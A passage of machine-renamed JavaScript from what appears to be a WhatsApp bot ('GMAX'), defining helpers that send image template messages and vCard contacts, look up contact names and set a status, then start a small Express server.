    let v98 = await prepareWAMessageMedia({
      image: p70,
      jpegThumbnail: p72
    }, {
      upload: vMakeWASocket.waUploadToServer
    });
    var vGenerateWAMessageFromContent = generateWAMessageFromContent(p67, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          imageMessage: v98.imageMessage,
          hydratedContentText: p68,
          hydratedFooterText: p69,
          hydratedButtons: p71
        }
      }
    }), p73);
    vMakeWASocket.relayMessage(p67, vGenerateWAMessageFromContent.message, {
      messageId: vGenerateWAMessageFromContent.key.id
    });
  };
  vMakeWASocket.getName = (p74, p75 = false) => {
    id = vMakeWASocket.decodeJid(p74);
    p75 = vMakeWASocket.withoutContact || p75;
    let v99;
    if (id.endsWith("@g.us")) {
      return new Promise(async p76 => {
        v99 = store.contacts[id] || {};
        if (!v99.name.notify && !v99.subject) {
          v99 = vMakeWASocket.groupMetadata(id) || {};
        }
        p76(v99.name || v99.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    } else {
      v99 = id === "0@s.whatsapp.net" ? {
        id: id,
        name: "WhatsApp"
      } : id === vMakeWASocket.decodeJid(vMakeWASocket.user.id) ? vMakeWASocket.user : store.contacts[id] || {};
    }
    return (p75 ? "" : v99.name) || v99.subject || v99.verifiedName || PhoneNumber("+" + p74.replace("@s.whatsapp.net", "")).getNumber("international");
  };
  vMakeWASocket.sendContact = async (p77, p78, p79 = "", p80 = {}) => {
    let v100 = [];
    for (let v101 of p78) {
      v100.push({
        displayName: await vMakeWASocket.getName(v101 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:" + (await vMakeWASocket.getName(v101 + "@s.whatsapp.net")) + "\nFN:" + global.OwnerName + "\nitem1.TEL;waid=" + v101 + ":" + v101 + "\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:" + global.email + "\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/" + global.github + "/GMAX\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;" + global.location + ";;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      });
    }
    vMakeWASocket.sendMessage(p77, {
      contacts: {
        displayName: v100.length + " Contact",
        contacts: v100
      },
      ...p80
    }, {
      quoted: p79
    });
  };
  vMakeWASocket.setStatus = p81 => {
    vMakeWASocket.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status"
      },
      content: [{
        tag: "status",
        attrs: {},
        content: Buffer.from(p81, "utf-8")
      }]
    });
    return p81;
  };
  vMakeWASocket.serializeM = p82 => sms(vMakeWASocket, p82, store);
}
vExpress2.use(express2.static(path2.join(__dirname, "lib")));
vExpress2.get("/", (p83, p84) => {
  p84.redirect("/gmax.html");
});
vExpress2.listen(v8, () => console.log("Server listening on port http://localhost:" + v8));
setTimeout(() => {
  f2();
}, 4000);
